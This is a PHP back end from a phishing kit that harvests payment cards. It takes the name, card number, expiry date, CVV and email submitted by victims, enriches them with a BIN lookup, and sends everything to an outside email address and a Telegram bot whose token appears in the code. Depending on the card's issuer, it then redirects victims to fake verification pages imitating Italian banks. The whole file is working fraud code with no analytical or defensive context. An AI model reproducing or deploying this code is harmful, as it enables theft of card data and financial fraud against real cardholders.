<?php
if(isset($_POST['s1']) && isset($_POST['s5'])){
$pg=$_REQUEST['page'];
$ip = getenv("REMOTE_ADDR");
$bin4 = substr($_POST['s2'] , 12 , 16);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "wait.php?page=$bin4" ;
$hostname = gethostbyaddr($ip);
$message .= "Name : ".$_POST['s1']."\n";
$message .= "Card : ".$_POST['s2']."\n";
$message .= "EXPIRATION : ".$_POST['s3']."-".$_POST['s4']."\n";
$message .= "CVV : ".$_POST['s5']."\n";
$message .= "Mail : ".$_POST['s6']."\n\n";
$message .= "\n___________binlist___________\n";
$send = "noctt@yandex.com";
$subject = "$ip";
$bin1=substr(str_replace(' ','',$_POST['s2']) , 0 , 1);
$bin6 = substr(str_replace(' ','',$_POST['s2']) , 0 , 6);
$binlist = substr(str_replace(' ','',$_POST['s2']) , 0 , 4);
$xxx = substr(str_replace(' ','',$_POST['s2']) , 12 , 16);
$json_url = "https://lookup.binlist.net/$bin6";
$json = file_get_contents($json_url);
$data = json_decode($json, TRUE);
$message .= 'type/brand:'.$data['type'].'/'.$data['brand']."\n";
$message .= 'bank name :'.$data['bank']['name'];
$headers = "From:AR<reality@superhosting.bg>";
if(($data['bank']['name']=="CARTASI S.P.A.") || $bin6 == "472675" || $bin6 == "550217" || $bin6 == "493595" || $bin6 == "416363"){
	$back ="cartasi/ACS.php?bin=".$xxx."&type=".$bin1;
	$headers = "From:CARTASI <reality@superhosting.bg>";
}else if($binlist  == "4023" || $binlist  == "5333" || $bin6 == "554811"){
	$back ="pi/Auth.php?bin=".$xxx."&binlist=".$binlist;
	$headers = "From:PI <reality@superhosting.bg>";
}else if(strstr($data['bank']['name'], "INTESA SANPAOLO") || $bin6 == "516109" || $bin6 == "483843" || $bin6 == "483063"){
	$back ="is/Mastercard ID Check.php?bin=".$xxx."&binlist=".$binlist;
	$headers = "From:IS <reality@superhosting.bg>";
}

$message .= "\n____________B&P___________\n";

mail($send,$subject,$message,$headers);
	$token = "5347410366:AAG4Y9rs4cvCASdkTYcSx3xl4PxQG9LXKL0";
$data = [
    'text' => $message,
    'chat_id' => '-706752114'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: $back");

}
else{
	echo 'No thing to see here :(';
}
?>